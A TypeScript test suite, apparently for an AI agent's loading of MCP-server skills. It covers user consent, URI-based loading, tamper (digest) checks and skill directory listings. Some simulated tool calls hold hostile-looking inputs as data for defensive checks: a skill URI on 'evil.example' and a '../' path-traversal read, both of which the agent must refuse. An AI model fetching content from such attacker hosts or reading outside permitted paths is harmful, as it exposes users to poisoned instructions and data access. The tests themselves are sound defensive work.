    await agent.run({ input: 'commit it' })
    assert.deepEqual(
      skillAsks(asked).map((r) => r.input),
      [{ name: 'docs/git-workflow' }],
    )
    assert.deepEqual(
      s.events.filter((e) => e.type === 'skill.activated'),
      [],
    )
    const executor = executorRequests(s.llm)[0]
    assert.ok(!systemOf(executor).includes('### Skill: docs/git-workflow'))
    assert.ok(!seenByModel(s.llm).includes(SKILL_MARKERS.gitWorkflow))
    assert.ok(
      s.logs.some((l) =>
        /warn \[skills\] docs\/git-workflow is not loaded: The user did not allow/.test(l),
      ),
    )
  })
})

test('mcp skills consent: bound to the entry - a skill whose files changed is asked about again', async () => {
  await withStack({}, async (s) => {
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      { skills: true },
      {
        toolApproval: {
          onRequest: (req) => {
            asked.push(req)
            return true
          },
        },
      },
    )
    // A change of the server's skills reaches the agent as a resource list change: wait for the
    // refresh it starts.
    const refreshed = () => s.logs.filter((l) => /docs: tool list refreshed/.test(l)).length
    const change = async (body: string) => {
      const before = refreshed()
      await s.srv.addSkill('release-notes', 'Write the release notes', body)
      const deadline = Date.now() + 10_000
      while (refreshed() === before && Date.now() < deadline) {
        await new Promise((r) => setTimeout(r, 25))
      }
      assert.ok(refreshed() > before, 'refreshed')
    }
    await change('# Notes v1\n')
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/release-notes' } }] }
    await agent.run({ input: 'write them' })
    await agent.run({ input: 'write them again' })
    assert.equal(skillAsks(asked).length, 1, 'the same entry: asked once')
    await change('# Notes v2\n')
    await agent.run({ input: 'and now' })
    assert.equal(skillAsks(asked).length, 2, 'another digest: asked again')
    assert.match(skillAsks(asked)[1].skill?.body ?? '', /Notes v2/)
  })
})

test('mcp skills consent: no answer in time is a refusal nobody gave - asked again next time', async () => {
  await withStack({}, async (s) => {
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      { skills: true },
      {
        toolApproval: {
          timeoutMs: 50,
          onRequest: (req) => {
            asked.push(req)
            return new Promise(() => {})
          },
        },
      },
    )
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
      ],
    }
    const result = await agent.run({ input: 'go' })
    const [first, second] = callsOf(result)
    assert.match(errorText(first.output), /No one answered whether the skill "docs\/git-workflow"/)
    assert.match(errorText(second.output), /No one answered/)
    assert.equal(skillAsks(asked).length, 2)
    const resolved = s.events.filter((e) => e.type === 'tool.approval-resolved')
    assert.ok(resolved.every((e) => e.type === 'tool.approval-resolved' && e.automatic))
  })
})

// ── by URI: a skill the listing does not hold, from the server that names it ────────────────

test('mcp skills by URI: loaded from the right server only (skills/get), under the same rules; joins the catalog', async () => {
  const other = await startLocalMcpServer({ protocol: 'modern', skills: true })
  try {
    await withStack({}, async (s) => {
      const asked: IToolApprovalRequest[] = []
      const agent = await s.open(
        {},
        {
          mcpServers: {
            docs: { url: s.srv.url, protocol: 'modern', skills: true },
            other: { url: other.url, protocol: 'modern', skills: true },
          },
          toolApproval: {
            onRequest: (req) => {
              asked.push(req)
              return true
            },
          },
        },
      )
      assert.ok(!agent.listSkills().some((k) => k.name === 'docs/release-checklist'))
      s.scenario = {
        calls: [{ name: 'load_skill', args: { server: 'docs', uri: SKILL_URIS.unlisted } }],
      }
      const result = await agent.run({ input: 'check the release' })
      const [load] = callsOf(result)
      assert.equal(load.ok, true)
      const out = load.output as { name: string; content: string }
      assert.equal(out.name, 'docs/release-checklist')
      assert.match(
        out.content,
        /^\[A skill from the MCP server "docs" \(skill:\/\/internal\/release-checklist\/SKILL.md\)/,
      )
      assert.ok(out.content.includes(SKILL_MARKERS.unlisted))
      assert.deepEqual(s.srv.skillGets, [SKILL_URIS.unlisted])
      assert.deepEqual(other.skillGets, [], 'the URI went to docs only')
      assert.deepEqual(other.skillReads, [])
      // The person was asked, and told it was named by URI.
      assert.deepEqual(
        skillAsks(asked).map((r) => [r.skill?.name, r.skill?.byUri, r.input]),
        [['docs/release-checklist', true, { server: 'docs', uri: SKILL_URIS.unlisted }]],
      )
      // In the catalog for the rest of the session, as a skill of docs.
      assert.deepEqual(
        agent.listSkills().find((k) => k.name === 'docs/release-checklist')?.server,
        'docs',
      )
      // load_skill says so in its description, naming the servers.
      const executor = executorRequests(s.llm)[0] as unknown as {
        tools?: { function: { name: string; description: string } }[]
      }
      const desc = executor.tools?.find((t) => t.function.name === 'load_skill')?.function
        .description
      assert.match(String(desc), /pass "server" .* and "uri"/)
      assert.match(String(desc), /Servers whose skills can be loaded: docs, other\./)
    })
  } finally {
    await other.close()
  }
})

test('mcp skills by URI: refused before any request - a server not opted in, an unknown one, a URI not skill://', async () => {
  const plain = await startLocalMcpServer({ protocol: 'modern', skills: true })
  try {
    await withStack({}, async (s) => {
      const agent = await s.open(
        {},
        {
          mcpServers: {
            docs: { url: s.srv.url, protocol: 'modern', skills: { consent: 'never' } },
            // Serves skills, but its config did not ask for them.
            plain: { url: plain.url, protocol: 'modern' },
          },
        },
      )
      s.scenario = {
        calls: [
          { name: 'load_skill', args: { server: 'plain', uri: SKILL_URIS.unlisted } },
          { name: 'load_skill', args: { server: 'nobody', uri: SKILL_URIS.unlisted } },
          { name: 'load_skill', args: { server: 'docs', uri: 'https://evil.example/x/SKILL.md' } },
          { name: 'load_skill', args: { server: 'docs', uri: 'skill://x/README.md' } },
          { name: 'load_skill', args: { uri: SKILL_URIS.unlisted } },
        ],
      }
      const result = await agent.run({ input: 'go' })
      const outs = callsOf(result).map((c) => [c.ok, errorText(c.output)])
      assert.ok(outs.every(([ok]) => ok === false))
      assert.match(
        String(outs[0][1]),
        /"plain" is not a server whose skills can be loaded; those are: docs/,
      )
      assert.match(String(outs[1][1]), /"nobody" is not a server/)
      assert.match(String(outs[2][1]), /is not a skill:\/\/ URI/)
      assert.match(String(outs[3][1]), /not the SKILL.md of a named skill directory/)
      assert.match(String(outs[4][1]), /no server given/)
      assert.deepEqual(s.srv.skillGets, [])
      assert.deepEqual(plain.skillGets, [])
      assert.ok(!plain.requests.some((r) => r.method.startsWith('skills/')))
    })
  } finally {
    await plain.close()
  }
})

test('mcp skills by URI: a URI another server serves is asked of the named one only - its -32602 reaches the model', async () => {
  const other = await startLocalMcpServer({ protocol: 'modern', skills: true })
  try {
    await other.addSkill(
      'elsewhere/vendor-guide',
      'The vendor guide',
      '# Vendor\n\nVENDOR-BODY\n',
      {
        listed: false,
      },
    )
    await withStack({}, async (s) => {
      const agent = await s.open(
        {},
        {
          mcpServers: {
            docs: { url: s.srv.url, protocol: 'modern', skills: { consent: 'never' } },
            other: { url: other.url, protocol: 'modern', skills: { consent: 'never' } },
          },
        },
      )
      const uri = 'skill://elsewhere/vendor-guide/SKILL.md'
      s.scenario = { calls: [{ name: 'load_skill', args: { server: 'docs', uri } }] }
      const [load] = callsOf(await agent.run({ input: 'read the vendor guide' }))
      assert.equal(load.ok, false)
      assert.match(
        errorText(load.output),
        /the MCP server "docs" gave no skill for skill:\/\/elsewhere\/vendor-guide\/SKILL.md: the server serves no skill at that URI \(-32602/,
      )
      assert.deepEqual(s.srv.skillGets, [uri])
      assert.deepEqual(other.skillGets, [], 'never sent to the server that does serve it')
      assert.ok(!seenByModel(s.llm).includes('VENDOR-BODY'))
      // Named with its own server, it loads.
      s.scenario = { calls: [{ name: 'load_skill', args: { server: 'other', uri } }] }
      const [ok] = callsOf(await agent.run({ input: 'read it' }))
      assert.equal(ok.ok, true)
      assert.equal((ok.output as { name: string }).name, 'other/vendor-guide')
    })
  } finally {
    await other.close()
  }
})

test('mcp skills by URI: the entry rules and verification hold - dynamic refused, a tampered body not used', async () => {
  await withStack({}, async (s) => {
    Object.assign(s.srv.skillFaults, {
      emptyListing: true,
      digest: true,
      dynamic: true,
      nameMismatch: false,
    })
    const agent = await s.open()
    assert.deepEqual(agent.listSkills(), [], 'an empty listing')
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { server: 'docs', uri: 'skill://tampered/SKILL.md' } },
        { name: 'load_skill', args: { server: 'docs', uri: 'skill://generated/SKILL.md' } },
        { name: 'load_skill', args: { server: 'docs', uri: 'skill://git-workflow/SKILL.md' } },
      ],
    }
    const [tampered, generated, honest] = callsOf(await agent.run({ input: 'go' }))
    assert.equal(tampered.ok, false)
    assert.match(
      errorText(tampered.output),
      /does not match the entry the server listed \(digest\)/,
    )
    assert.equal(generated.ok, false)
    assert.match(errorText(generated.output), /is refused: its content is generated/)
    assert.equal(honest.ok, true, 'a skill the empty listing left out is loadable by URI')
    assert.ok(!seenByModel(s.llm).includes('TAMPERED-BODY'))
    assert.ok(!agent.listSkills().some((k) => k.name.includes('generated')))
  })
})

test('mcp skills by URI: counted against the per-server cap - refused before skills/get when full', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.extra = 40
    const agent = await s.open()
    assert.equal(agent.listSkills().length, 32)
    s.scenario = {
      calls: [{ name: 'load_skill', args: { server: 'docs', uri: SKILL_URIS.unlisted } }],
    }
    const [load] = callsOf(await agent.run({ input: 'go' }))
    assert.equal(load.ok, false)
    assert.match(
      errorText(load.output),
      /"docs" already has 32 skills in the catalog \(at most 32 per server\)/,
    )
    assert.deepEqual(s.srv.skillGets, [])
  })
})

test('mcp skills by URI: it never shadows - a name in use makes it take its path', async () => {
  await withStack({}, async (s) => {
    await s.srv.addSkill(
      'internal/git-workflow',
      'Another git workflow',
      '# Other\n\nOTHER-GIT\n',
      {
        listed: false,
      },
    )
    const agent = await s.open(
      {},
      { skills: [{ name: 'git-workflow', description: 'Ours', content: 'HOST-GIT-WORKFLOW' }] },
    )
    s.scenario = {
      calls: [
        {
          name: 'load_skill',
          args: { server: 'docs', uri: 'skill://internal/git-workflow/SKILL.md' },
        },
        { name: 'load_skill', args: { name: 'git-workflow' } },
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
      ],
    }
    const [byUri, host, listed] = callsOf(await agent.run({ input: 'go' }))
    assert.equal((byUri.output as { name: string }).name, 'docs/internal/git-workflow')
    assert.ok((byUri.output as { content: string }).content.includes('OTHER-GIT'))
    assert.equal((host.output as { content: string }).content, 'HOST-GIT-WORKFLOW')
    assert.ok((listed.output as { content: string }).content.includes(SKILL_MARKERS.gitWorkflow))
    assert.deepEqual(
      agent
        .listSkills()
        .map((k) => k.name)
        .filter((n) => n.includes('git-workflow')),
      ['git-workflow', 'docs/git-workflow', 'docs/internal/git-workflow'],
    )
  })
})

test("mcp skills consent: 'ask' - a skill let in by an earlier run is not active in a run whose person said no", async () => {
  await withStack({}, async (s) => {
    const answers = [true, false]
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      { skills: { consent: 'ask' } },
      {
        toolApproval: {
          onRequest: (req) => {
            asked.push(req)
            return answers.shift() ?? false
          },
        },
      },
    )
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/git-workflow' } }] }
    await agent.run({ input: 'first' })
    assert.equal(skillAsks(asked).length, 1)
    // The next run: the planner picks it, the person says no.
    s.events.length = 0
    const before = executorRequests(s.llm).length
    s.scenario = { planned: ['docs/git-workflow'] }
    await agent.run({ input: 'second' })
    assert.equal(skillAsks(asked).length, 2)
    assert.deepEqual(
      s.events.filter((e) => e.type === 'skill.activated'),
      [],
    )
    const executor = executorRequests(s.llm).slice(before)
    assert.ok(executor.length > 0)
    assert.ok(executor.every((r) => !systemOf(r).includes(SKILL_MARKERS.gitWorkflow)))
  })
})

// ── a directory of a skill: read_skill_file on a directory; resources/directory/read ─────────

const directoryReadsOn = (wire: IWire) =>
  wire.bodies.filter((b) => b.method === 'resources/directory/read')

test('mcp skills directories: listed from the held entry; no directoryRead - never asked on the wire', async () => {
  await withStack({}, async (s) => {
    const agent = await s.open()
    const read = (path: string) => ({
      name: 'read_skill_file',
      args: { name: 'docs/pdf-processing', path },
    })
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/pdf-processing' } },
        read('.'),
        read('references/'),
        read('./scripts'),
        read('nope'),
        read('../git-workflow'),
      ],
    }
    const result = await agent.run({ input: 'fill the form' })
    const [, root, references, scripts, nope, up] = callsOf(result)
    assert.deepEqual(root.output, {
      name: 'docs/pdf-processing',
      directory: '.',
      files: [],
      directories: ['references', 'scripts'],
    })
    assert.deepEqual(references.output, {
      name: 'docs/pdf-processing',
      directory: 'references',
      files: ['references/FORMS.md'],
      directories: [],
    })
    assert.deepEqual((scripts.output as { files: string[] }).files, ['scripts/extract.py'])
    // Neither a file nor a directory of it: the error it always was.
    assert.equal(nope.ok, false)
    assert.match(errorText(nope.output), /has no file "nope"; its files: references\/FORMS.md/)
    assert.equal(up.ok, false)
    assert.match(errorText(up.output), /not a path inside the skill/)
    // The server did not declare directoryRead: the method is never called - not even tried.
    assert.deepEqual(directoryReadsOn(s.wire), [])
    assert.deepEqual(s.srv.skillDirectoryReads, [])
    assert.ok(!s.logs.some((l) => l.includes('resources/directory/read')), s.logs.join('\n'))
    // A listing reads no file.
    assert.deepEqual(s.srv.skillReads, ['skill://pdf-processing/SKILL.md'])
  })
})

test("mcp skills directories: with directoryRead the skill's own server is asked, by the directory URI, page by page", async () => {
  const other = await startLocalMcpServer({
    protocol: 'modern',
    skills: true,
    skillDirectoryRead: true,
  })
  try {
    await withStack({ directoryRead: { pageSize: 1 } }, async (s) => {
      const agent = await s.open(
        {},
        {
          mcpServers: {
            docs: {
              url: s.srv.url,
              protocol: 'modern',
              skills: { consent: 'never' },
              fetch: s.wire.fetch,
            },
            other: { url: other.url, protocol: 'modern', skills: { consent: 'never' } },
          },
        },
      )
      s.scenario = {
        calls: [
          { name: 'read_skill_file', args: { name: 'docs/pdf-processing', path: '/' } },
          { name: 'read_skill_file', args: { name: 'docs/pdf-processing', path: 'references' } },
        ],
      }
      const result = await agent.run({ input: 'fill the form' })
      const [root, references] = callsOf(result)
      assert.deepEqual(root.output, {
        name: 'docs/pdf-processing',
        directory: '.',
        files: [],
        directories: ['references', 'scripts'],
      })
      assert.deepEqual((references.output as { files: string[] }).files, ['references/FORMS.md'])
      assert.equal((references.output as { note?: string }).note, undefined, 'the views agree')
      // The root has three children (SKILL.md, references, scripts): three pages of one.
      assert.deepEqual(s.srv.skillDirectoryReads, [
        'skill://pdf-processing',
        'skill://pdf-processing',
        'skill://pdf-processing',
        'skill://pdf-processing/references',
      ])
      const sent = directoryReadsOn(s.wire).map((b) => b.params as Record<string, unknown>)
      assert.deepEqual(
        sent.map((p) => [p.uri, p.cursor]),
        [
          ['skill://pdf-processing', undefined],
          ['skill://pdf-processing', '1'],
          ['skill://pdf-processing', '2'],
          ['skill://pdf-processing/references', undefined],
        ],
      )
      // Never another server: the skill's own only.
      assert.deepEqual(other.skillDirectoryReads, [])
      assert.ok(!other.requests.some((r) => r.method === 'resources/directory/read'))
    })
  } finally {
    await other.close()
  }
})

test('mcp skills directories: what the server lists beyond the entry never reaches the model - a note, a warning, a refresh', async () => {
  await withStack({ directoryRead: true }, async (s) => {
    s.srv.skillFaults.directoryExtra = true
    const agent = await s.open()
    const lists = () => s.srv.requests.filter((r) => r.method === 'skills/list').length
    const listedAtConnect = lists()
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/pdf-processing' } },
        { name: 'read_skill_file', args: { name: 'docs/pdf-processing', path: 'references/' } },
      ],
    }
    const result = await agent.run({ input: 'fill the form' })
    const listing = callsOf(result)[1].output as Record<string, unknown>
    assert.deepEqual(listing.files, ['references/FORMS.md'])
    assert.equal(listing.notServed, undefined)
    assert.match(
      String(listing.note),
      /^The server now lists 1 more item\(s\) here than the approved entry of this skill: the skill changed on the server\./,
    )
    // Not its name, URI or anything of it: in the result, and in everything the model was sent.
    assert.ok(!JSON.stringify(listing).includes('NEW'))
    assert.ok(!seenByModel(s.llm).includes('NEW.md'))
    assert.ok(!seenByModel(s.llm).includes(SKILL_MARKERS.newFile))
    assert.ok(!s.srv.skillReads.includes(SKILL_URIS.newFile), 'never read')
    assert.ok(
      s.logs.some((l) =>
        /^warn \[mcp\] docs: the skill "pdf-processing" \(skill:\/\/pdf-processing\/SKILL.md\) changed on the server - its directory "references" lists 1 item\(s\) its entry does not/.test(
          l,
        ),
      ),
    )
    assert.ok(!s.logs.some((l) => l.includes('NEW.md')), 'counts only, in the log too')
    // The server's skills are listed again - between runs, not behind this one.
    const deadline = Date.now() + 10_000
    while (lists() === listedAtConnect && Date.now() < deadline) {
      await new Promise((r) => setTimeout(r, 25))
    }
    assert.equal(lists(), listedAtConnect + 1, 'one refresh after the run')
    // The entry did not change (only the directory did): the file still cannot be read.
    s.scenario = {
      calls: [
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'references/NEW.md' },
        },
      ],
    }
    const again = await agent.run({ input: 'read the new one' })
    assert.equal(callsOf(again)[0].ok, false)
    assert.match(errorText(callsOf(again)[0].output), /has no file "references\/NEW.md"/)
    assert.ok(!s.srv.skillReads.includes(SKILL_URIS.newFile))
  })
})

test('mcp skills directories: what the entry holds and the server no longer lists is marked notServed', async () => {
  await withStack({ directoryRead: true }, async (s) => {
    s.srv.skillFaults.directoryOmit = true
    const agent = await s.open()
    s.scenario = {
      calls: [{ name: 'read_skill_file', args: { name: 'docs/pdf-processing', path: 'scripts' } }],
    }
    const result = await agent.run({ input: 'run it' })
    const listing = callsOf(result)[0].output as Record<string, unknown>
    assert.deepEqual(listing.files, ['scripts/extract.py'], 'kept: the entry is authoritative')
    assert.deepEqual(listing.notServed, ['scripts/extract.py'])
    assert.match(String(listing.note), /1 item\(s\) listed here \(notServed\) are no longer listed/)
    assert.ok(s.logs.some((l) => /warn .*its entry does not and not 1 it does/.test(l)))
  })
})

test('mcp skills directories: a directory read that fails - the listing from the entry, no note, a log line', async () => {
  await withStack({ directoryRead: true }, async (s) => {
    s.srv.skillFaults.directoryError = true
    const agent = await s.open()
    s.scenario = {
      calls: [
        { name: 'read_skill_file', args: { name: 'docs/pdf-processing', path: 'references' } },
      ],
    }
    const result = await agent.run({ input: 'fill the form' })
    const [call] = callsOf(result)
    assert.equal(call.ok, true)
    assert.deepEqual(call.output, {
      name: 'docs/pdf-processing',
      directory: 'references',
      files: ['references/FORMS.md'],
      directories: [],
    })
    assert.deepEqual(s.srv.skillDirectoryReads, ['skill://pdf-processing/references'])
    assert.ok(
      s.logs.some((l) =>
        /^warn \[mcp\] docs: resources\/directory\/read of skill:\/\/pdf-processing\/references failed - .*\(-32603\); the directory is listed from the skill's entry alone/.test(
          l,
        ),
      ),
    )
  })
})

test('mcp skills directories: before consent a directory is refused exactly like a file - nothing asked of the server', async () => {
  await withStack({ directoryRead: true }, async (s) => {
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      { skills: true },
      {
        toolApproval: {
          onRequest: (req) => {
            asked.push(req)
            return { approved: false, reason: 'no' }
          },
        },
      },
    )
    s.scenario = {
      calls: [
        { name: 'read_skill_file', args: { name: 'docs/pdf-processing', path: 'references' } },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'references/FORMS.md' },
        },
      ],
    }
    const result = await agent.run({ input: 'fill the form' })
    const [directory, file] = callsOf(result)
    assert.equal(directory.ok, false)
    assert.match(
      errorText(directory.output),
      /The user did not allow the skill "docs\/pdf-processing" of the MCP server "docs" to be loaded \(no\)/,
    )
    assert.equal(file.ok, false)
    assert.match(errorText(file.output), /already refused the skill "docs\/pdf-processing"/)
    assert.deepEqual(
      skillAsks(asked).map((r) => r.skill?.name),
      ['docs/pdf-processing'],
    )
    assert.deepEqual(s.srv.skillDirectoryReads, [], 'no directory read before a yes')
    assert.deepEqual(s.srv.skillReads, ['skill://pdf-processing/SKILL.md'])
  })
  // Nobody to ask: not loaded, the directory not listed.
  await withStack({ directoryRead: true }, async (s) => {
    const agent = await s.open({ skills: true })
    s.scenario = {
      calls: [
        { name: 'read_skill_file', args: { name: 'docs/pdf-processing', path: 'references' } },
      ],
    }
    const result = await agent.run({ input: 'fill the form' })
    assert.equal(callsOf(result)[0].ok, false)
    assert.match(errorText(callsOf(result)[0].output), /no one can be asked/)
    assert.deepEqual(s.srv.skillDirectoryReads, [])
  })
})

test("mcp skills directories: the host's skills list their directories too", async () => {
  await withStack({ directoryRead: true }, async (s) => {
    const agent = await s.open(
      { skills: undefined },
      {
        skills: [
          {
            name: 'invoices',
            description: 'Invoice rules',
            content: 'Pick a template from templates/.',
            files: [
              { path: 'rates.json', content: '{}' },
              { path: 'templates/eu.md', content: 'EU' },
              { path: 'templates/regional/nordics.md', content: 'N' },
            ],
          },
        ],
      },
    )
    s.scenario = {
      calls: [
        { name: 'read_skill_file', args: { name: 'invoices', path: '.' } },
        { name: 'read_skill_file', args: { name: 'invoices', path: 'templates/' } },
        { name: 'read_skill_file', args: { name: 'invoices', path: 'templates/eu.md' } },
        { name: 'read_skill_file', args: { name: 'invoices', path: 'nope' } },
      ],
    }
    const result = await agent.run({ input: 'invoice it' })
    const [root, templates, file, nope] = callsOf(result)
    assert.deepEqual(root.output, {
      name: 'invoices',
      directory: '.',
      files: ['rates.json'],
      directories: ['templates'],
    })
    assert.deepEqual(templates.output, {
      name: 'invoices',
      directory: 'templates',
      files: ['templates/eu.md'],
      directories: ['templates/regional'],
    })
    assert.equal(file.output, 'EU')
    assert.equal(nope.ok, false)
    assert.match(errorText(nope.output), /has no file "nope"/)
    assert.deepEqual(s.srv.skillDirectoryReads, [], 'a host skill asks no server')
  })
})
